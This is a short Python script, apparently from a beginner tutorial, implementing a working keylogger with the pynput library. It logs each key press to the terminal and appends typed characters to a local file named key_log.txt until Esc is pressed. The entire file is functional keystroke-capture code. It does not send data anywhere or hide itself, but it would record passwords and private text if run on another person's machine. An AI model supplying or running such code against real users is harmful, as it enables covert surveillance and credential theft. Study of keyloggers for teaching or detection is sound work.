import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
	global keys, count
	
	keys.append(key)
	count += 1
	print("{0} pressed".format(key)) # print on the terminal
	
	if count == 1: # after every 1 key count it is update into the file
		count = 0
		write_file(keys)
		keys = []
	
def write_file(keys): #write to a file
	with open("key_log.txt", "a") as f: # create a text file in the same directory as the python file
		for key in keys: # loop through all the keys and append it into the file
			k = str(key).replace("'","")
			if k.find("space") > 0: # with every space pressed, write enter
				f.write('\n')
			elif k.find("Key") == -1:  # don't write any other commands like backspace, ctrl, and others
				f.write(k)

def on_release(key): # exit the keylogger when esc key is pressed
	if key == Key.esc:
		return False

with Listener(on_press=on_press, on_release=on_release) as listener: #listener
	listener.join()

#A basic and simple python keylogger
#Requirement: pynput external module (https://github.com/moses-palmer/pynput)
#Reference: https://www.youtube.com/watch?v=TbMKwl11itQ&ab_channel=freeCodeCamp.org
